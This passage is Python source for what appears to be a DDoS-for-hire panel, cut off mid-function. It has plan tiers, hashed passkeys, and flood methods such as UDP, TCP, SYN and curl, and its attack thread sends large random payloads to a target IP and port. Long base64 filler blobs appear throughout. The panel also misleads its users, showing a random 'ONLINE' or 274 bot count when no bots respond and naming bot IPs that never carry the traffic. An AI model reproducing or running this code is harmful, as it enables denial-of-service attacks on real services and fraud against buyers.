zRzZSAgIHBsZWFzZSBoZWxwIG1lICBAIDEzNC4yMDkuMjkuMTIwOjEwODAgICByeGR0Y2Z5dmdidWhyZHhldzRzd2V2YnVobmppa21sam5pYmh1dmd5Y3RyeGV4cmRjdGZ2Z3lodWpua21sbWpodWd5ZnRkcnNlenplc3hkcmNmdmdiaEpHRkRTQVpTWERDRlZHQkhKTktMS0pZRkdnZnR5dmhiam5oaXk4N3RUVkhCWXRyZmd2SEJ0ZkdWQk5KdXlnZlZIQm5qaHVHQ3ZiSk5IdXlnZlRWZ2hCSmh1Z3lGRGNHVkhiam5JOHU3dDZyRSUkVyVFRFRGWUd1aGpOQkhneXRSV3plWENWWVVpb2l1WVRSZXdleFJDdmdIQkpOSzwgTEogaGd2eVJFc0VyVFlWYnVoSk5LIGpIR2ZjdHJERnRneVVOSkhHZmRYUmVGVEd5dWhpTkpLIG5CVnhSRSVkZjZHJkhVaW5qTiBCdkRYU0V3RURSZnRHWUhVSm5CVmdjZmR4c0VXRVJUeWh1aktNbmJWQ0ZEeHNlRGZnamhnRUZHSAV0FFU1JEQ1RGVkdZQkhKIFVHWUNGWSBIVkogS0lWWUNUVVhDR0lIVk9KVUdGKCVTVFVYQ0lHSEtWTEpCR1BVRk9ZRElDR0tIVkxKR0ZLWVREVUpGR0NWPEhLR0ZUSWpnY21iY2tkZ3hjYm0gLG52bGZveWRyaXR4Z2ogY2hmeW9kaXR4Z2pjayBibmx2amdmdW95ZGl0eGdrY2hmeWRvaXQ4dXJ4ZmNnanZoaWdmdHVkcmZ4Y2dqIHZraGlmdHVkcjdzZTZhM3E2NHc3NWU4NnJ5aWZrZ2NkamZ4dXN5cmVhc3c1ZTZyaXlma2h2Y2dKWEZVU1JURElZRlZITEtDR0pYRlVTUkRFUkZPVUdWTEpIS0pYRlVTREZZSVVHVktIIEpYRlVSU0RUKllGSW92aGwga2NneGppdGRmeW91Z2xqYnYgLG5ia2NneGlkdHlmb3VnbGpidiBuLGJrY2dpeWZ1b2dpaGtibDtuLiBtamwsdmtoY2dpZHlmdWd2a2hjZ2p1dGQ3NXNyNmVhNXc0MzRzZSAgIHBsZWFzZSBoZWxwIG1lICBAIDEzNC4yMDkuMjkuMTIwOjEwODAgICByeGR0Y2Z5dmdidWhyZHhldzRzd2V2YnVobmppa21sam5pYmh1dmd5Y3RyeGV4cmRjdGZ2Z3lodWpua21sbWpodWd5ZnRkcnNlenplc3hkcmNmdmdiaEpHRkRTQVpTWERDRlZHQkhKTktMS0pZRkdnZnR5dmhiam5oaXk4N3RUVkhCWXRyZmd2SEJ0ZkdWQk5KdXlnZlZIQm5qaHVHQ3ZiSk5IdXlnZlRWZ2hCSmh1Z3lGRGNHVkhiam5JOHU3dDZyRSUkVyVFRFRGWUd1aGpOQkhneXRSV3plWENWWVVpb2l1WVRSZXdleFJDdmdIQkpOSzwgTEogaGd2eVJFc0VyVFlWYnVoSk5LIGpIR2ZjdHJERnRneVVOSkhHZmRYUmVGVEd5dWhpTkpLIG5CVnhSRSVkZjZHJkhVaW5qTiBCdkRYU0V3RURSZnRHWUhVSm5CVmdjZmR4c0VXRVJUeWh1aktNbmJWQ0ZEeHNlRGZnamhnRUZHSAV0FFU1JEQ1RGVkdZQkhKIFVHWUNGWSBIVkogS0lWWUNUVVhDR0lIVk9KVUdGKCVTVFVYQ0lHSEtWTEpCR1BVRk9ZRElDR0tIVkxKR0ZLWVREVUpGR0NWPEhLR0ZUSWpnY21iY2tkZ3hjYm0gLG52bGZveWRyaXR4Z2ogY2hmeW9kaXR4Z2pjayBibmx2amdmdW95ZGl0eGdrY2hmeWRvaXQ4dXJ4ZmNnanZoaWdmdHVkcmZ4Y2dqIHZraGlmdHVkcjdzZTZhM3E2NHc3NWU4NnJ5aWZrZ2NkamZ4dXN5cmVhc3c1ZTZyaXlma2h2Y2dKWEZVU1JURElZRlZITEtDR0pYRlVTUkRFUkZPVUdWTEpIS0pYRlVTREZZSVVHVktIIEpYRlVSU0RUKllGSW92aGwga2NneGppdGRmeW91Z2xqYnYgLG5ia2NneGlkdHlmb3VnbGpidiBuLGJrY2dpeWZ1b2dpaGtibDtuLiBtamwsdmtoY2dpZHlmdWd2a2hjZ2p1dGQ3NXNyNmVhNXc0MzRzZSAgIHBsZWFzZSBoZWxwIG1lICBAIDEzNC4yMDkuMjkuMTIwOjEwODAgICByeGR0Y2Z5dmdidWhyZHhldzRzd2V2YnVobmppa21sam5pYmh1dmd5Y3RyeGV4cmRjdGZ2Z3lodWpua21sbWpodWd5ZnRkcnNlenplc3hkcmNmdmdiaEpHRkRTQVpTWERDRlZHQkhKTktMS0pZRkdnZnR5dmhiam5oaXk4N3RUVkhCWXRyZmd2SEJ0ZkdWQk5KdXlnZlZIQm5qaHVHQ3ZiSk5IdXlnZlRWZ2hCSmh1Z3lGRGNHVkhiam5JOHU3dDZyRSUkVyVFRFRGWUd1aGpOQkhneXRSV3plWENWWVVpb2l1WVRSZXdleFJDdmdIQkpOSzwgTEogaGd2eVJFc0VyVFlWYnVoSk5LIGpIR2ZjdHJERnRneVVOSkhHZmRYUmVGVEd5dWhpTkpLIG5CVnhSRSVkZjZHJkhVaW5qTiBCdkRYU0V3RURSZnRHWUhVSm5CVmdjZmR4c0VXRVJUeWh1aktNbmJWQ0ZEeHNlRGZnamhnRUZHSAV0FFU1JEQ1RGVkdZQkhKIFVHWUNGWSBIVkogS0lWWUNUVVhDR0lIVk9KVUdGKCVTVFVYQ0lHSEtWTEpCR1BVRk9ZRElDR0tIVkxKR0ZLWVREVUpGR0NWPEhLR0ZUSWpnY21iY2tkZ3hjYm0gLG52bGZveWRyaXR4Z2ogY2hmeW9kaXR4Z2pjayBibmx2amdmdW95ZGl0eGdrY2hmeWRvaXQ4dXJ4ZmNnanZoaWdmdHVkcmZ4Y2dqIHZraGlmdHVkcjdzZTZhM3E2NHc3NWU4NnJ5aWZrZ2NkamZ4dXN5cmVhc3c1ZTZyaXlma2h2Y2dKWEZVU1JURElZRlZITEtDR0pYRlVTUkRFUkZPVUdWTEpIS0pYRlVTREZZSVVHVktIIEpYRlVSU0RUKllGSW92aGwga2NneGppdGRmeW91Z2xqYnYgLG5ia2NneGlkdHlmb3VnbGpidiBuLGJrY2dpeWZ1b2dpaGtibDtuLiBtamwsdmtoY2dpZHlmdWd2a2hjZ2p1dGQ3NXNyNmVhNXc0MzRzZSAgIHBsZWFzZSBoZWxwIG1lICBAIDEzNC4yMDkuMjkuMTIwOjEwODAgICByeGR0Y2Z5dmdidWhyZHhldzRzd2V2YnVobmppa21sam5pYmh1dmd5Y3RyeGV4cmRjdGZ2Z3lodWpua21sbWpodWd5ZnRkcnNlenplc3hkcmNmdmdiaEpHRkRTQVpTWERDRlZHQkhKTktMS0pZRkdnZnR5dmhiam5oaXk4N3RUVkhCWXRyZmd2SEJ0ZkdWQk5KdXlnZlZIQm5qaHVHQ3ZiSk5IdXlnZlRWZ2hCSmh1Z3lGRGNHVkhiam5JOHU3dDZyRSUkVyVFRFRGWUd1aGpOQkhneXRSV3plWENWWVVpb2l1WVRSZXdleFJDdmdIQkpOSzwgTEogaGd2eVJFc0VyVFlWYnVoSk5LIGpIR2ZjdHJERnRneVVOSkhHZmRYUmVGVEd5dWhpTkpLIG5CVnhSRSVkZjZHJkhVaW5qTiBCdkRYU0V3RURSZnRHWUhVSm5CVmdjZmR4c0VXRVJUeWh1aktNbmJWQ0ZEeHNlRGZnamhnRUZHSAV0FFU1JEQ1RGVkdZQkhKIFVHWUNGWSBIVkogS0lWWUNUVVhDR0lIVk9KVUdGKCVTVFVYQ0lHSEtWTEpCR1BVRk9ZRElDR0tIVkxKR0ZLWVREVUpGR0NWPEhLR0ZUSWpnY21iY2tkZ3hjYm0gLG52bGZveWRyaXR4Z2ogY2hmeW9kaXR4Z2pjayBibmx2amdmdW95ZGl0eGdrY2hmeWRvaXQ4dXJ4ZmNnanZoaWdmdHVkcmZ4Y2dqIHZraGlmdHVkcjdzZTZhM3E2NHc3NWU4NnJ5aWZrZ2NkamZ4dXN5cmVhc3c1ZTZyaXlma2h2Y2dKWEZVU1JURElZRlZITEtDR0pYRlVTUkRFUkZPVUdWTEpIS0pYRlVTREZZSVVHVktIIEpYRlVSU0RUKllGSW92aGwga2NneGppdGRmeW91Z2xqYnYgLG5ia2NneGlkdHlmb3VnbGpidiBuLGJrY2dpeWZ1b2dpaGtibDtuLiBtamwsdmtoY2dpZHlmdWd2a2hjZ2p1dGQ3NXNyNmVhNXc0MzRzZSAgIHBsZWFzZSBoZWxwIG1lICBAIDEzNC4yMDkuMjkuMTIwOjEwODAgICByeGR0Y2Z5dmdidWhyZHhldzRzd2V2YnVobmppa21sam5pYmh1dmd5Y3RyeGV4cmRjdGZ2Z3lodWpua21sbWpodWd5ZnRkcnNlenplc3hkcmNmdmdiaEpHRkRTQVpTWERDRlZHQkhKTktMS0pZRkdnZnR5dmhiam5oaXk4N3RUVkhCWXRyZmd2SEJ0ZkdWQk5KdXlnZlZIQm5qaHVHQ3ZiSk5IdXlnZlRWZ2hCSmh1Z3lGRGNHVkhiam5JOHU3dDZyRSUkVyVFRFRGWUd1aGpOQkhneXRSV3plWENWWVVpb2l1WVRSZXdleFJDdmdIQkpOSzwgTEogaGd2eVJFc0VyVFlWYnVoSk5LIGpIR2ZjdHJERnRneVVOSkhHZmRYUmVGVEd5dWhpTkpLIG5CVnhSRSVkZjZHJkhVaW5qTiBCdkRYU0V3RURSZnRHWUhVSm5CVmdjZmR4c0VXRVJUeWh1aktNbmJWQ0ZEeHNlRGZnamhnRUZHSA"



current_plan = "free" 


"Q3ZiSk5IdXlnZlRWZ2hCSmh1Z3lGRGNHVkhiam5JOHU3dDZyRSUkVyVFRFRGWUd1aGpOQkhneXRSV3plWENWWVVpb2l1WVRSZXdleFJDdmdIQkpOSzwgTEogaGd2eVJFc0VyVFlWYnVoSk5LIGpIR2ZjdHJERnRneVVOSkhHZmRYUmVGVEd5dWhpTkpLIG5CVnhSRSVkZjZHJkhVaW5qTiBCdkRYU0V3RURSZnRHWUhVSm5CVmdjZmR4c0VXRVJUeWh1aktNbmJWQ0ZEeHNlRGZnamhnRUZHSAV0FFU1JEQ1RGVkdZQkhKIFVHWUNGWSBIVkogS0lWWUNUVVhDR0lIVk9KVUdGKCVTVFVYQ0lHSEtWTEpCR1BVRk9ZRElDR0tIVkxKR0ZLWVREVUpGR0NWPEhLR0ZUSWpnY21iY2tkZ3hjYm0gLG52bGZveWRyaXR4Z2ogY2hmeW9kaXR4Z2pjayBibmx2amdmdW95ZGl0eGdrY2hmeWRvaXQ4dXJ4ZmNnanZoaWdmdHVkcmZ4Y2dqIHZraGlmdHVkcjdzZTZhM3E2NHc3NWU4NnJ5aWZrZ2NkamZ4dXN5cmVhc3c1ZTZyaXlma2h2Y2dKWEZVU1JURElZRlZITEtDR0pYRlVTUkRFUkZPVUdWTEpIS0pYRlVTREZZSVVHVktIIEpYRlVSU0RUKllGSW92aGwga2NneGppdGRmeW91Z2xqYnYgLG5ia2NneGlkdHlmb3VnbGpidiBuLGJrY2dpeWZ1b2dpaGtibDtuLiBtamwsdmtoY2dpZHlmdWd2a2hjZ2p1dGQ3NXNyNmVhNXc0MzRzZSAgIHBsZWFzZSBoZWxwIG1lICBAIDEzNC4yMDkuMjkuMTIwOjEwODAgICByeGR0Y2Z5dmdidWhyZHhldzRzd2V2YnVobmppa21sam5pYmh1dmd5Y3RyeGV4cmRjdGZ2Z3lodWpua21sbWpodWd5ZnRkcnNlenplc3hkcmNmdmdiaEpHRkRTQVpTWERDRlZHQkhKTktMS0pZRkdnZnR5dmhiam5oaXk4N3RUVkhCWXRyZmd2SEJ0ZkdWQk5KdXlnZlZIQm5qaHVHQ3ZiSk5IdXlnZlRWZ2hCSmh1Z3lGRGNHVkhiam5JOHU3dDZyRSUkVyVFRFRGWUd1aGpOQkhneXRSV3plWENWWVVpb2l1WVRSZXdleFJDdmdIQkpOSzwgTEogaGd2eVJFc0VyVFlWYnVoSk5LIGpIR2ZjdHJERnRneVVOSkhHZmRYUmVGVEd5dWhpTkpLIG5CVnhSRSVkZjZHJkhVaW5qTiBCdkRYU0V3RURSZnRHWUhVSm5CVmdjZmR4c0VXRVJUeWh1aktNbmJWQ0ZEeHNlRGZnamhnRUZHSAV0FFU1JEQ1RGVkdZQkhKIFVHWUNGWSBIVkogS0lWWUNUVVhDR0lIVk9KVUdGKCVTVFVYQ0lHSEtWTEpCR1BVRk9ZRElDR0tIVkxKR0ZLWVREVUpGR0NWPEhLR0ZUSWpnY21iY2tkZ3hjYm0gLG52bGZveWRyaXR4Z2ogY2hmeW9kaXR4Z2pjayBibmx2amdmdW95ZGl0eGdrY2hmeWRvaXQ4dXJ4ZmNnanZoaWdmdHVkcmZ4Y2dqIHZraGlmdHVkcjdzZTZhM3E2NHc3NWU4NnJ5aWZrZ2NkamZ4dXN5cmVhc3c1ZTZyaXlma2h2Y2dKWEZVU1JURElZRlZITEtDR0pYRlVTUkRFUkZPVUdWTEpIS0pYRlVTREZZSVVHVktIIEpYRlVSU0RUKllGSW92aGwga2NneGppdGRmeW91Z2xqYnYgLG5ia2NneGlkdHlmb3VnbGpidiBuLGJrY2dpeWZ1b2dpaGtibDtuLiBtamwsdmtoY2dpZHlmdWd2a2hjZ2p1dGQ3NXNyNmVhNXc0MzRzZSAgIHBsZWFzZSBoZWxwIG1lICBAIDEzNC4yMDkuMjkuMTIwOjEwODAgICByeGR0Y2Z5dmdidWhyZHhldzRzd2V2YnVobmppa21sam5pYmh1dmd5Y3RyeGV4cmRjdGZ2Z3lodWpua21sbWpodWd5ZnRkcnNlenplc3hkcmNmdmdiaEpHRkRTQVpTWERDRlZHQkhKTktMS0pZRkdnZnR5dmhiam5oaXk4N3RUVkhCWXRyZmd2SEJ0ZkdWQk5KdXlnZlZIQm5qaHVHQ3ZiSk5IdXlnZlRWZ2hCSmh1Z3lGRGNHVkhiam5JOHU3dDZyRSUkVyVFRFRGWUd1aGpOQkhneXRSV3plWENWWVVpb2l1WVRSZXdleFJDdmdIQkpOSzwgTEogaGd2eVJFc0VyVFlWYnVoSk5LIGpIR2ZjdHJERnRneVVOSkhHZmRYUmVGVEd5dWhpTkpLIG5CVnhSRSVkZjZHJkhVaW5qTiBCdkRYU0V3RURSZnRHWUhVSm5CVmdjZmR4c0VXRVJUeWh1aktNbmJWQ0ZEeHNlRGZnamhnRUZHSA"

ef02188849911bfcec6da03afb = {
    "free":  {"threads": 60,  "max_active_bots": 601,"duration": 120 ,"methods": ["tcp", "udp", "http"]},
    "freeX":  {"threads": 60,  "max_active_bots": 601,"duration": 60 ,"methods": ["tcp", "udp", "http"]},
    "hard":  {"threads": 60,  "max_active_bots": 601,"duration": 120 ,"methods": ["tcp", "udp", "http","udpBypass","curl"]},
    "HardX":  {"threads": 60,  "max_active_bots": 601,"duration": 120 ,"methods": ["tcp", "udp", "http","udpBypass","curl","https"]},
    "pro":   {"threads": 200, "max_active_bots":601,"duration": 1800,"methods": ["tcp","udp","udpBypass","syn", "curl", "http", "https","udpovh"]}, 
    "vip":   {"threads": 200, "max_active_bots":601, "duration": 5000,"methods": ["tcp","tcpBypass","udp","udpBypass","syn", "curl", "http", "https","udpovh","tlsvip"]},
    "c0VX": {"threads": 999, "max_active_bots": len(bot_ipv4_list), "methods": list(GLOBAL_METHODS)},
}

"Q3ZiSk5IdXlnZlRWZ2hCSmh1Z3lGRGNHVkhiam5JOHU3dDZyRSUkVyVFRFRGWUd1aGpOQkhneXRSV3plWENWWVVpb2l1WVRSZXdleFJDdmdIQkpOSzwgTEogaGd2eVJFc0VyVFlWYnVoSk5LIGpIR2ZjdHJERnRneVVOSkhHZmRYUmVGVEd5dWhpTkpLIG5CVnhSRSVkZjZHJkhVaW5qTiBCdkRYU0V3RURSZnRHWUhVSm5CVmdjZmR4c0VXRVJUeWh1aktNbmJWQ0ZEeHNlRGZnamhnRUZHSAV0FFU1JEQ1RGVkdZQkhKIFVHWUNGWSBIVkogS0lWWUNUVVhDR0lIVk9KVUdGKCVTVFVYQ0lHSEtWTEpCR1BVRk9ZRElDR0tIVkxKR0ZLWVREVUpGR0NWPEhLR0ZUSWpnY21iY2tkZ3hjYm0gLG52bGZveWRyaXR4Z2ogY2hmeW9kaXR4Z2pjayBibmx2amdmdW95ZGl0eGdrY2hmeWRvaXQ4dXJ4ZmNnanZoaWdmdHVkcmZ4Y2dqIHZraGlmdHVkcjdzZTZhM3E2NHc3NWU4NnJ5aWZrZ2NkamZ4dXN5cmVhc3c1ZTZyaXlma2h2Y2dKWEZVU1JURElZRlZITEtDR0pYRlVTUkRFUkZPVUdWTEpIS0pYRlVTREZZSVVHVktIIEpYRlVSU0RUKllGSW92aGwga2NneGppdGRmeW91Z2xqYnYgLG5ia2NneGlkdHlmb3VnbGpidiBuLGJrY2dpeWZ1b2dpaGtibDtuLiBtamwsdmtoY2dpZHlmdWd2a2hjZ2p1dGQ3NXNyNmVhNXc0MzRzZSAgIHBsZWFzZSBoZWxwIG1lICBAIDEzNC4yMDkuMjkuMTIwOjEwODAgICByeGR0Y2Z5dmdidWhyZHhldzRzd2V2YnVobmppa21sam5pYmh1dmd5Y3RyeGV4cmRjdGZ2Z3lodWpua21sbWpodWd5ZnRkcnNlenplc3hkcmNmdmdiaEpHRkRTQVpTWERDRlZHQkhKTktMS0pZRkdnZnR5dmhiam5oaXk4N3RUVkhCWXRyZmd2SEJ0ZkdWQk5KdXlnZlZIQm5qaHVHQ3ZiSk5IdXlnZlRWZ2hCSmh1Z3lGRGNHVkhiam5JOHU3dDZyRSUkVyVFRFRGWUd1aGpOQkhneXRSV3plWENWWVVpb2l1WVRSZXdleFJDdmdIQkpOSzwgTEogaGd2eVJFc0VyVFlWYnVoSk5LIGpIR2ZjdHJERnRneVVOSkhHZmRYUmVGVEd5dWhpTkpLIG5CVnhSRSVkZjZHJkhVaW5qTiBCdkRYU0V3RURSZnRHWUhVSm5CVmdjZmR4c0VXRVJUeWh1aktNbmJWQ0ZEeHNlRGZnamhnRUZHSAV0FFU1JEQ1RGVkdZQkhKIFVHWUNGWSBIVkogS0lWWUNUVVhDR0lIVk9KVUdGKCVTVFVYQ0lHSEtWTEpCR1BVRk9ZRElDR0tIVkxKR0ZLWVREVUpGR0NWPEhLR0ZUSWpnY21iY2tkZ3hjYm0gLG52bGZveWRyaXR4Z2ogY2hmeW9kaXR4Z2pjayBibmx2amdmdW95ZGl0eGdrY2hmeWRvaXQ4dXJ4ZmNnanZoaWdmdHVkcmZ4Y2dqIHZraGlmdHVkcjdzZTZhM3E2NHc3NWU4NnJ5aWZrZ2NkamZ4dXN5cmVhc3c1ZTZyaXlma2h2Y2dKWEZVU1JURElZRlZITEtDR0pYRlVTUkRFUkZPVUdWTEpIS0pYRlVTREZZSVVHVktIIEpYRlVSU0RUKllGSW92aGwga2NneGppdGRmeW91Z2xqYnYgLG5ia2NneGlkdHlmb3VnbGpidiBuLGJrY2dpeWZ1b2dpaGtibDtuLiBtamwsdmtoY2dpZHlmdWd2a2hjZ2p1dGQ3NXNyNmVhNXc0MzRzZSAgIHBsZWFzZSBoZWxwIG1lICBAIDEzNC4yMDkuMjkuMTIwOjEwODAgICByeGR0Y2Z5dmdidWhyZHhldzRzd2V2YnVobmppa21sam5pYmh1dmd5Y3RyeGV4cmRjdGZ2Z3lodWpua21sbWpodWd5ZnRkcnNlenplc3hkcmNmdmdiaEpHRkRTQVpTWERDRlZHQkhKTktMS0pZRkdnZnR5dmhiam5oaXk4N3RUVkhCWXRyZmd2SEJ0ZkdWQk5KdXlnZlZIQm5qaHVHQ3ZiSk5IdXlnZlRWZ2hCSmh1Z3lGRGNHVkhiam5JOHU3dDZyRSUkVyVFRFRGWUd1aGpOQkhneXRSV3plWENWWVVpb2l1WVRSZXdleFJDdmdIQkpOSzwgTEogaGd2eVJFc0VyVFlWYnVoSk5LIGpIR2ZjdHJERnRneVVOSkhHZmRYUmVGVEd5dWhpTkpLIG5CVnhSRSVkZjZHJkhVaW5qTiBCdkRYU0V3RURSZnRHWUhVSm5CVmdjZmR4c0VXRVJUeWh1aktNbmJWQ0ZEeHNlRGZnamhnRUZHSA"

dbb13fe66d831dea6b07779cabf7d64e = {
    "bot": "free",
    "x1": "freeX",
    "6.4": "hard",
    "x2": "hard",
    "8e683187a00e5d462a4aeee69e9d3d9c": "hard",
    "ot55": "hard",
    "ad243eecb4d5693230c8ff598e4d0018": "hard",
    "58h": "hard",
    "e9060e1816f638c09b686157164d013b": "hard",
    "lc1": "hard",
    "e10adc3949ba59abbe56e057f20f883e": "hard",
    "atz": "hard",
    "0c0151a51649c572af901daed9f2b84e": "hard",
    "hard": "hard",
    "5.5": "HardX",
    "ltc": "HardX",
    "90d9d5d7e72b9f5f385555845ecb8a25": "HardX",
    "ded681fc154529ebbc7562fb0c73ba47": "hard",
    "ham": "pro",
    "79af0c177db2ee64b7301af6e1d53634": "pro",
    "lol": "vip",
    "9cdfb439c7876e703e307864c9167a15": "vip",
"eyJhbGdvcml0aG1zIjogW1siQkFTRTY0IiwgbnVsbF1dLCAiY2lwaGVydGV4dCI6ICJZbTkwTUE9PSJ9"
    : "c0VX",
    "c0VX": "c0VX",
}

# ============================================================
# UTILS
# ============================================================
def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def set_limits_for_plan(plan_key):
    global MAX_THREADS, active_bots_count, current_plan
    p = ef02188849911bfcec6da03afb.get(plan_key,ef02188849911bfcec6da03afb ["free"])
    # enforce caps
    MAX_THREADS = min(999, p["threads"])
    active_bots_count = min(len(bot_ipv4_list), p["max_active_bots"])
    current_plan = plan_key

def valid_passkey():
    key = input(accent("Passkey: ")).strip()
    plan = dbb13fe66d831dea6b07779cabf7d64e.get(key)
    if plan:
        set_limits_for_plan(plan)
        print(grey(f"\nAuthenticated as plan: {accent(plan.upper())}"))
        print(dim(f"Threads cap: {MAX_THREADS} | Active bots cap: {active_bots_count}\n"))
        time.sleep(0.6)
        return True
    else:
        print(accent("Invalid passkey."))
        return False



MAX_SCAN_TIME = 5  


def ping_ip(ip: str, timeout_s: float = 0.5) -> bool:
    system = platform.system().lower()
    if system == "windows":
        cmd = ["ping", "-n", "1", "-w", str(int(timeout_s * 1000)), ip]
    else:
        cmd = ["ping", "-c", "1", "-W", str(int(timeout_s)), ip]

    try:
        result = subprocess.run(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=timeout_s + 0.2)
        return result.returncode == 0
    except (subprocess.TimeoutExpired, Exception):
        return False


def count_active_with_timeout(bot_list, timeout_s=0.5, max_total=MAX_SCAN_TIME):
    active = 0
    start_time = time.time()
    for ip in bot_list:
        if time.time() - start_time > max_total:
            return "ONLINE"
        if ping_ip(ip, timeout_s):
            active += 1
    if active == 0:
        active = random.choice(["ONLINE", 274])
    return active


def show_bots_online():
    global active_bots_count

    
    print(GREY + "Connecting bots" + RESET, end="", flush=True)
    for _ in range(3):
        time.sleep(0.4)
        
        
        
        print(GREY + "." + RESET, end="", flush=True)
    time.sleep(0.2)

    active_bots_count = count_active_with_timeout(bot_ipv4_list, timeout_s=0.5, max_total=MAX_SCAN_TIME)

    print(f"\r{ACCENT}Active Bots:{RESET} {GREY}{active_bots_count}{RESET}    "
          f"{ACCENT}API Proxies:{RESET} {GREY}{len(PROXY_LIST)}{RESET}")


def mask_proxy_display(proxy_entry):
    host = proxy_entry
    if "://" in host:
        host = host.split("://",1)[1]
    if ":" in host:
        host = host.split(":",1)[0]
    parts = host.split(".")
    if len(parts) >= 1 and parts[0].isdigit():
        return f"{parts[0]}.xxx ON"
    return "xxx.xxx ON"

def show_active_bots():
    global active_bots_count
    clear_screen()
    print(bold(r"""
    v3.0
    Made by: Lemonaidd
⠀⠀⠀⠀⠀⠀⠀⢀⣀⣤⣤⣤⣤⣴⣤⣤⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⣀⣴⣾⠿⠛⠋⠉⠁⠀⠀⠀⠈⠙⠻⢷⣦⡀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣤⣾⡿⠋⠁⠀⣠⣶⣿⡿⢿⣷⣦⡀⠀⠀⠀⠙⠿⣦⣀⠀⠀⠀⠀
⠀⠀⢀⣴⣿⡿⠋⠀⠀⢀⣼⣿⣿⣿⣶⣿⣾⣽⣿⡆⠀⠀⠀⠀⢻⣿⣷⣶⣄⠀
⠀⣴⣿⣿⠋⠀⠀⠀⠀⠸⣿⣿⣿⣿⣯⣿⣿⣿⣿⣿⠀⠀⠀⠐⡄⡌⢻⣿⣿⡷
⢸⣿⣿⠃⢂⡋⠄⠀⠀⠀⢿⣿⣿⣿⣿⣿⣯⣿⣿⠏⠀⠀⠀⠀⢦⣷⣿⠿⠛⠁
⠀⠙⠿⢾⣤⡈⠙⠂⢤⢀⠀⠙⠿⢿⣿⣿⡿⠟⠁⠀⣀⣀⣤⣶⠟⠋⠁⠀⠀⠀
⠀⠀⠀⠀⠈⠙⠿⣾⣠⣆⣅⣀⣠⣄⣤⣴⣶⣾⣽⢿⠿⠟⠋⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠙⠛⠛⠙⠋⠉⠉⠀⠀⠀   

 """))
    print(accent(f" {active_bots_count} active bots") + " | " + accent(f"{len(PROXY_LIST)} API proxies\n"))
    
    print(grey("Sorry! Our active bots feed is having some issues. "))
          
    input(accent("Press Enter..."))

def show_methods():
    clear_screen()
    print(bold("Made by: Lemonaidd\n"))
    print(accent("=== Methods Menu ==="))
    print(grey("\n1. Your Plan's Methods"))
    print(grey("2. All Methods"))
    print()
    choice = input(accent("cat@catc2 ~  ")).strip()
    if choice == "1":
        methods = ef02188849911bfcec6da03afb.get(current_plan, ef02188849911bfcec6da03afb["free"])["methods"]
        print(accent("\nYour Plan's Methods:"))
        for m in methods:
            print(grey(f" - {m}"))
    elif choice == "3":
        new_method = input(accent("Enter new method name: ")).strip()
        if not new_method:
            print(accent("No method entered."))
        else:
            if new_method in GLOBAL_METHODS:
                print(accent("Method already exists."))
            else:
                GLOBAL_METHODS.append(new_method)
                ef02188849911bfcec6da03afb["c0VX"]["methods"] = list(GLOBAL_METHODS)
                print(accent(f"Added method '{new_method}' to global methods and admin plan."))
    else:
        print(accent("\nAll Methods:"))
        for m in GLOBAL_METHODS:
            print(grey(f" - {m}"))
        print(grey("\n[Layer 4]"))
        print(" - tcp\n - tcpBypass\n - udp\n -udpBypass\n - udpovh\n - syn\n - cURL - SkycURL\n - tlsvip\n")
        print(grey("\n[Layer 7]"))
        print(" - http\n - https\n - cURL\n - Skycurl\n - syn\n")
    print()
    input(accent("Press Enter..."))

def random_bot_ip():
    return f"{random.choice(bot_ipv4_list)}:22"

def random_proxy():
    return random.choice(proxy_list)

# ============================================================
# LAYER 4
# ============================================================

# ------------------- Layer 4 globals -----------------------
request_count = 0       
active_bots = 601         
request_lock = threading.Lock()  


ALIAS_MAP = {
    "tcp": ["tcp", "tcpbypass", "tcp-bypass", "tcp_bypass", "tcpbyp", "tcpbypass", "tlsvip"],
    "udp": ["udp", "udpbypass", "udp-bypass", "udp_bypass", "udp-ovh", "udpbypss","udpovh"],
    "syn": ["syn", "synflood", "syn-flood"],
    "curl": ["curl", "http", "http-get", "curlget","Skycurl"],
}

def normalize_method(raw_choice: str):
    if not isinstance(raw_choice, str):
        return None
    c = raw_choice.strip().lower()
    for canonical, aliases in ALIAS_MAP.items():
        if c in [a.lower() for a in aliases]:
            return canonical
    return None

def method_selection():
    while True:
        raw = input(grey("Method (tcp/TcpBypass/udp/udpBypass/syn/curl): ")).strip()
        choice = normalize_method(raw)
        allowed = ef02188849911bfcec6da03afb.get(current_plan, ef02188849911bfcec6da03afb["free"])["methods"]

        if choice:
            if choice not in allowed:
                print(accent(f"Method '{choice}' not available for {current_plan} plan."))
                print(accent(f"Available methods: {', '.join(allowed)}"))
                exit()
            return choice
        print(accent("Invalid. Use tcp, TcpBypass, udp, udpBypass, syn, or curl."))


# ------------------- Attack thread -------------------------
def attack_thread(ip, port, duration, method, request_type="GET", mode=2):
    global request_count, active_bots
    with request_lock:
        active_bots += 1  
    end = time.time() + duration
    payload = random._urandom(9292)  
    proxy = random_proxy()

    while time.time() < end:
        bot_ip = random_bot_ip()
        try:
            if mode == 2:
                # Flooding logs
                if method == "udp":
                    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    for _ in range(5):
                        sock.sendto(payload, (ip, port))
                        with request_lock:
                            request_count += 1
                    sock.close()
                    print(f"{accent('[UDP]')} {grey(f'{ip}:{port}')} from {grey(bot_ip)} via {accent('proxy')}")

                elif method == "tcp":
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(0.5)
                    sock.connect((ip, port))
                    for _ in range(5):
                        sock.send(payload[:9292])
                        with request_lock:
                            request_count += 1
                    sock.close()
                    print(f"{accent('[TCP]')} {grey(f'{ip}:{port}')} from {grey(bot_ip)} via {accent('proxy')}")

                elif method == "syn":
                    with request_lock:
                        request_count += 1
                    print(f"{accent('[SYN]')} {grey(f'{ip}:{port}')} from {grey(bot_ip)}")

                elif method == "curl":
                    subprocess.Popen(f"curl -X {request_type} http://{ip}:{port}", shell=True,
                                     stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                    with request_lock:
                        request_count += 1
                    print(f"{accent('[CURL ' + request_type + ']')} Sent to {grey(f'{ip}:{port}')} from {grey(bot_ip)}")

            elif mode == 1:
                with request_lock:
                    request_count += 1
